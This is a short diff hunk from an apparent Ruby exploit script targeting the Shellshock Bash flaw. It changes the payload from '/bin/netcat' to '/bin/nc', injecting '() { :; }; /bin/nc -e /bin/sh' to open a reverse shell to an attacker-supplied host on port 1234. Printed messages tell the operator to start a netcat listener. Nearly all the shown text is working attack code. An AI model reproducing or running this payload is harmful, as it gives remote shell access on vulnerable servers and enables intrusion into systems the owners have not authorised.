@@ -77,7 +77,7 @@ def exploit(target,dest)
   
     puts pink("[Info]     Please use NC to listen on port 1234 for reverse shell..........")
     puts pink("[Info]     Exploiting for a reverse shell to connect "+ dest+":1234 via netcat ..........")
-    expayload="() { :; }; /bin/netcat -e /bin/sh "+dest+" 1234"
+    expayload="() { :; }; /bin/nc -e /bin/sh "+dest+" 1234"
 
   begin     
     http = Net::HTTP.new(URI(url).host)
